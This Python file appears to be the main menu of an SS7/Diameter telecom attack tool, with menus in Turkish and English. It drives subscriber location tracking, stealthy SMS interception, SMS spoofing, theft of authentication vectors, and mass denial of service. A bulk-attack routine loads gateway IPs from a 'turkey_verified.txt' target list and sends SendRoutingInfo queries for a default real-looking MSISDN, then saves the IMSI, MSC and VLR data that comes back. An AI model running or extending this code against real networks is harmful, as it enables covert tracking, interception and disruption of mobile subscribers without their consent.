#!/usr/bin/env python
# encoding: utf-8
'''
SS7 main 

@author:     Loay MYK

@copyright:  2026. All rights reserved.

@license:    MIT license
'''

import os
import time
import ss7.tracking
import ss7.fraud
import ss7.interception
import ss7.dos
import sigploit



def cleaner():
    import glob
    for f in glob.glob("*.xml"):
        try:
            os.remove(f)
        except OSError:
            pass

def ss7tracking():
    os.system('cls' if os.name == 'nt' else 'clear')

    print(" \033[31mLocation Tracking\033[0m ".center(105, "#"))
    print(" \033[34mSelect a Message from the below\033[0m ".center(105, "#"))
    print()
    print("   Message".rjust(10) + "\t\t\tDescription")
    print("   --------                    ------------")
    print("0) SendRoutingInfo".rjust(21) + "\t\tLocation Tracking, used to route calls could be blocked")
    print("1) ProvideSubscriberInfo".rjust(27) + "\tReliable Location Tracking")
    print("2) SendRoutingInfoForSM".rjust(26) + "\tReliable Location Tracking, if SMS home routing is not applied,should be run twice to check consistent replies")
    print("3) AnyTimeInterrogation".rjust(26) + "\tLocation Tracking, blocked by most of operators")
    print("4) SendRoutingInfoForGPRS".rjust(28) + "\tLocation tracking, used to route data, it will retrieve SGSN GT")

    print()
    print("or type back to go back to Attacks Menu".rjust(42))

    choice = input(
        "\033[37m(\033[0m\033[2;31mtracking\033[0m\033[37m)>\033[0m ").strip().lower()

    if choice == "0":
        ss7.tracking.sri()
    elif choice == "1":
        ss7.tracking.psi()
    elif choice == "2":
        ss7.tracking.srism()
    elif choice == "3":
        ss7.tracking.ati()
    elif choice == "4":
        ss7.tracking.srigprs()
    elif choice == "back":
        attacksMenu()
    else:
        print('\n\033[31m[-]Error:\033[0m Please Enter a Valid Choice (0 - 4)')
        time.sleep(1.5)
        ss7tracking()


def ss7interception():
    os.system('cls' if os.name == 'nt' else 'clear')

    print(" \033[31mInterception\033[0m ".center(105, "#"))
    print(" \033[34mSelect a Message from the below\033[0m ".center(105, "#"))
    print()
    print("   Message".rjust(10) + "\t\t\t\tDescription")
    print("   --------                             -----------")
    print("0) UpdateLocation".rjust(20) + "\t\t\tStealthy SMS Interception")

    print()
    print("or type back to go back to Attacks Menu".rjust(42))

    choice = input(
        "\033[37m(\033[0m\033[2;31minterception\033[0m\033[37m)>\033[0m ").strip().lower()

    if choice == "0":
        ss7.interception.ul()

    elif choice == "back":
        attacksMenu()
    else:
        print('\n\033[31m[-]Error:\033[0m Please Enter a Valid Choice (0)')
        time.sleep(1.5)
        ss7interception()


def ss7fraud():
    os.system('cls' if os.name == 'nt' else 'clear')

    print(" \033[31mFraud & Info\033[0m ".center(105, "#"))
    print(" \033[34mSelect a Message from the below\033[0m ".center(105, "#"))
    print()
    print("   Message".rjust(10) + "\t\t\t\tDescription")
    print("   --------                            ------------")
    print("0) SendIMSI".rjust(14) + "\t\t\t\tRetrieving IMSI of a subscriber")
    print("1) MTForwardSMS".rjust(18) + "\t\t\tSMS Phishing and Spoofing")
    print("2) InsertSubscriberData".rjust(26) + "\t\tSubscriber Profile Manipulation")
    print("3) SendAuthenticationInfo".rjust(28) + "\t\tSubscriber Authentication Vectors retrieval")
    print("4) CancelLocation".rjust(20) + "\t\t\tCancel subscriber location (disconnect)")

    print()
    print("or type back to go back to Attacks Menu".rjust(42))

    choice = input(
        "\033[37m(\033[0m\033[2;31mfraud\033[0m\033[37m)>\033[0m ").strip().lower()

    if choice == "0":
        ss7.fraud.simsi()
    elif choice == "1":
        ss7.fraud.mtsms()
    elif choice == "2":
        ss7.fraud.isd()
    elif choice == "3":
        ss7.fraud.sai()
    elif choice == "4":
        ss7.fraud.cl()
    elif choice == "back":
        attacksMenu()
    else:
        print('\n\033[31m[-]Error:\033[0m Please Enter a Valid Choice (0-4)')
        time.sleep(1.5)
        ss7fraud()


def ss7dos():
    os.system('cls' if os.name == 'nt' else 'clear')

    print(" \033[31mDenial of Service\033[0m ".center(105, "#"))
    print(" \033[34mSelect a Message from the below\033[0m ".center(105, "#"))
    print()
    print("   Message".rjust(10) + "\t\t\t\tDescription")
    print("   --------                            ------------")
    print("0) PurgeMS-Subscriber DoS".rjust(28) + "\t\t Mass DoS attack on Subscribers to take them off network")

    print()
    print("or type back to go back to Attacks Menu".rjust(42))

    choice = input(
        "\033[37m(\033[0m\033[2;31mdos\033[0m\033[37m)>\033[0m ").strip().lower()

    if choice == "0":
        ss7.dos.purge()
    elif choice == "back":
        attacksMenu()
    else:
        print('\n\033[31m[-]Error:\033[0m Please Enter a Valid Choice (0)')
        time.sleep(1.5)
        ss7dos()


def attacksMenu():
    os.system('cls' if os.name == 'nt' else 'clear')

    print(" \033[34mSaldırı Kategorisi Seçin\033[0m ".center(105, "#"))
    print()
    print("0) Konum Takibi".rjust(18))
    print("1) Çağrı ve SMS Dinleme".rjust(26))
    print("2) Dolandırıcılık & Bilgi Toplama".rjust(36))
    print("3) DoS (Servis Engelleme)".rjust(28))
    print("4) Ağ Keşfi (Leak Tarayıcı)".rjust(30))
    print("5) Çoklu Protokol Tarayıcı (SS7+Diameter+GTP+SIP)".rjust(53))
    print("6) Diameter Saldırıları (4G/LTE)".rjust(35))
    print("7) SS7 Güvenlik Duvarı Testi".rjust(31))
    print("8) Toplu Gateway Saldırısı (Tüm IP'lere SRI)".rjust(48))
    print()
    print("Ana menüye dönmek için back yazın".rjust(36))
    print()

    choice = input(
        "\033[37m(\033[0m\033[2;31mattacks\033[0m\033[37m)>\033[0m ").strip().lower()

    if choice == "0":
        ss7tracking()

    elif choice == "1":
        ss7interception()

    elif choice == "2":
        ss7fraud()

    elif choice == "3":
        ss7dos()

    elif choice == "4":
        try:
            from ss7 import scan
            scan.scan_main()
            attacksMenu()
        except ImportError as e:
             print(f"Error importing scan module: {e}")
             time.sleep(2)
             attacksMenu()

    elif choice == "5":
        try:
            from ss7 import multi_scan
            multi_scan.multi_scan_menu()
            attacksMenu()
        except ImportError as e:
             print(f"Error importing multi_scan module: {e}")
             time.sleep(2)
             attacksMenu()

    elif choice == "6":
        try:
            from ss7.attacks import diameter_module
            diameter_module.diameter_menu()
            attacksMenu()
        except ImportError as e:
             print(f"\033[33m[!] Diameter module not available: {e}\033[0m")
             print(f"\033[33m[!] Use Multi-Protocol Scanner (option 5) to scan Diameter ports.\033[0m")
             time.sleep(2)
             attacksMenu()

    elif choice == "7":
        try:
            from ss7 import firewall_test
            firewall_test.firewall_test_menu()
            attacksMenu()
        except ImportError as e:
             print(f"Error importing firewall_test module: {e}")
             time.sleep(2)
             attacksMenu()

    elif choice == "8":
        _multi_gateway_attack_menu()
        attacksMenu()

    elif choice == "back":
        sigploit.mainMenu()
    else:
        print('\n\033[31m[-]Hata:\033[0m Geçerli bir seçim yapın (0 - 8)')
        time.sleep(1.5)
        attacksMenu()


def _multi_gateway_attack_menu():
    """Toplu gateway saldırısı - tüm bulunan IP'lere SRI gönder."""
    import sys
    import ipaddress
    print("\n" + "=" * 60)
    print(" Toplu Gateway Saldırısı")
    print(" Tüm bulunan IP'lere otomatik SRI gönderir")
    print(" 4 farklı yöntem dener: M3UA, Direct DATA, SUA, Alt-port")
    print("=" * 60 + "\n")

    # Collect targets
    targets = []
    def _is_valid_ip(value):
        try:
            ipaddress.ip_address(value)
            return True
        except ValueError:
            return False

    # Try to read from turkey_verified.txt
    verified_file = None
    for fname in ['turkey_verified.txt', 'turkey_ss7_results.txt']:
        if os.path.exists(fname):
            verified_file = fname
            break

    if verified_file:
        print(f"[+] {verified_file} okunuyor...")
        try:
            with open(verified_file, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('=') or line.startswith(' '):
                        continue
                    # Extract IP:port
                    import re
                    match = re.search(r'(\d+\.\d+\.\d+\.\d+):(\d+)', line)
                    if match:
                        ip = match.group(1)
                        port = int(match.group(2))
                        if not _is_valid_ip(ip):
                            continue
                        if not (1 <= port <= 65535):
                            continue
                        if (ip, port) not in targets:
                            targets.append((ip, port))
        except Exception as e:
            print(f"[-] Dosya okuma hatası: {e}")

    if not targets:
        print("[-] Kayıtlı hedef bulunamadı.")
        print("[*] Manuel hedef girin:")
        ip_input = input("IP adresleri (virgülle ayır): ").strip()
        if ip_input:
            def _parse_port(raw_port):
                try:
                    port_value = int(raw_port)
                    if 1 <= port_value <= 65535:
                        return port_value
                    print(f"[!] Geçersiz port aralığı: {raw_port}")
                except ValueError:
                    print(f"[!] Geçersiz port değeri: {raw_port}")
                return None

            for ip in ip_input.split(','):
                ip = ip.strip()
                if ':' in ip:
                    parts = ip.split(':')
                    if len(parts) != 2 or not parts[0]:
                        print(f"[!] Hatalı hedef formatı: {ip}")
                        continue
                    if not _is_valid_ip(parts[0].strip()):
                        print(f"[!] Geçersiz IP: {parts[0].strip()}")
                        continue
                    parsed_port = _parse_port(parts[1].strip())
                    if parsed_port is None:
                        continue
                    targets.append((parts[0], parsed_port))
                else:
                    if not _is_valid_ip(ip):
                        print(f"[!] Geçersiz IP: {ip}")
                        continue
                    targets.append((ip, 2905))

    if not targets:
        print("[-] Hedef yok.")
        return

    # Deduplicate - keep unique IPs, prefer port 2905
    seen_ips = {}
    for ip, port in targets:
        if ip not in seen_ips:
            seen_ips[ip] = port
        elif port == 2905:
            seen_ips[ip] = 2905
    unique_targets = [(ip, port) for ip, port in seen_ips.items()]

    print(f"\n[+] {len(unique_targets)} benzersiz hedef bulundu")
    for ip, port in unique_targets[:10]:
        print(f"    {ip}:{port}")
    if len(unique_targets) > 10:
        print(f"    ... ve {len(unique_targets) - 10} daha")

    # Get attack parameters
    print("\n[+] SS7 Yapılandırması:")
    def _prompt_int(prompt, default_value, min_value=None, max_value=None):
        while True:
            raw_value = input(f"{prompt} [{default_value}]: ").strip()
            if not raw_value:
                return default_value
            try:
                value = int(raw_value)
            except ValueError:
                print("[!] Lütfen sayısal bir değer girin.")
                continue
            if min_value is not None and value < min_value:
                print(f"[!] Değer en az {min_value} olmalı.")
                continue
            if max_value is not None and value > max_value:
                print(f"[!] Değer en fazla {max_value} olmalı.")
                continue
            return value

    def _prompt_msisdn(prompt, default_value):
        while True:
            raw_value = input(f"{prompt} [{default_value}]: ").strip()
            if not raw_value:
                return default_value
            if raw_value.isdigit():
                return raw_value
            print("[!] MSISDN sadece rakamlardan oluşmalı.")

    msisdn = _prompt_msisdn("Hedef MSISDN", "905536403424")
    opc = _prompt_int("OPC", 1, min_value=0, max_value=16383)
    dpc = _prompt_int("DPC", 2, min_value=0, max_value=16383)

    # Build SRI TCAP
    try:
        sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), 'ss7', 'attacks'))
        from ss7.attacks.map_layer import SendRoutingInfo
        sri = SendRoutingInfo(msisdn)
        tcap_data = sri.to_tcap_begin()
    except ImportError:
        try:
            from map_layer import SendRoutingInfo
            sri = SendRoutingInfo(msisdn)
            tcap_data = sri.to_tcap_begin()
        except ImportError:
            print("[-] MAP layer import hatası. ss7/attacks/map_layer.py kontrol edin.")
            return

    print(f"\n[+] MSISDN: {msisdn}")
    print(f"[+] MAP: SendRoutingInfo (OpCode: 22)")
    print(f"[+] TCAP Size: {len(tcap_data)} bytes")

    confirm = input(f"\n[?] {len(unique_targets)} hedefe saldırı başlatılsın mı? [E/h]: ").strip()
    if confirm.lower() in ('h', 'n', 'hayir', 'no'):
        print("[*] İptal edildi.")
        return

    # Execute
    try:
        from ss7.attacks.tcp_transport import multi_gateway_attack
    except ImportError:
        sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), 'ss7', 'attacks'))
        from tcp_transport import multi_gateway_attack

    results = multi_gateway_attack(unique_targets, opc, dpc, tcap_data)

    # Summary
    print("\n" + "=" * 60)
    print(" SONUÇ ÖZETİ")
    print("=" * 60)
    if results:
        print(f"\n\033[32m[+] {len(results)} gateway yanıt verdi!\033[0m\n")
        for r in results:
            ip = r.get('ip', '?')
            port = r.get('port', '?')
            method = r.get('method', 'M3UA')
            print(f"  \033[32m[+] {ip}:{port} ({method})\033[0m")
            if r.get('imsi'):
                print(f"      IMSI: {r['imsi']}")
            if r.get('msc'):
                print(f"      MSC:  {r['msc']}")
            if r.get('vlr'):
                print(f"      VLR:  {r['vlr']}")

        save_choice = input("\n[?] Sonuçlar dosyaya kaydedilsin mi? [E/h]: ").strip().lower()
        if save_choice not in ('h', 'n', 'hayir', 'no'):
            output_name = input("Dosya adı [ss7_gateway_results.txt]: ").strip() or "ss7_gateway_results.txt"
            try:
                with open(output_name, "w", encoding="utf-8") as f:
                    for r in results:
                        ip = r.get('ip', '?')
                        port = r.get('port', '?')
                        method = r.get('method', 'M3UA')
                        imsi = r.get('imsi', '')
                        msc = r.get('msc', '')
                        vlr = r.get('vlr', '')
                        f.write(f"{ip}:{port} {method} IMSI={imsi} MSC={msc} VLR={vlr}\n")
                print(f"[+] Sonuçlar kaydedildi: {output_name}")
            except OSError as e:
                print(f"[-] Dosya yazma hatası: {e}")

    else:
        print(f"\n\033[31m[-] Hiçbir gateway yanıt vermedi.\033[0m")
        print("[*] Tüm gateway'ler SS7 firewall ile korunuyor.")
        print("[*] GRX/IPX ağına erişim olmadan bu gateway'lere ulaşılamaz.")

    input("\nDevam etmek için Enter'a basın...")
